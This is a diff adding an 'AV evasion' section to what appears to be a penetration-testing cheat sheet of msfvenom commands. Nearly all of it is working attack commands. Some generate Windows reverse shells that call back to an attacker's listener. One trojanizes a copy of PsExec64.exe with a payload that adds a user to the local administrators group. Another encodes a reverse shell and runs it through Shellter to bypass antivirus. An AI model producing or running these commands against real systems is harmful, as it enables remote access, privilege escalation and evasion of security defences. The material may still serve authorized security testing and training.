@@ -69,3 +69,12 @@ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -
 ```bash
 msfvenom -p windows/shell_reverse_tcp -e cmd/powershell_base64 -b '\x0a\xotherbadchars' LHOST=<lhost> LPORT=5555 > shell.raw
 ```
+
+### av evasion/bypass with legit binary
+
+```bash
+msfvenom -p windows/x64/exec CMD="net localgroup administrators <some_user> /add" -f exe -x PsExec64.exe -o PsExec642.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST="$RHOST" LPORT=80 -f exe -e x86/shikata_ga_nai -i 8 -f raw -o rev.raw
+shellter -> (A)utomatic -> (N)o Stealthmode -> (C)ustom: Path to rev.raw -> (N)o reflective dll loader
+```
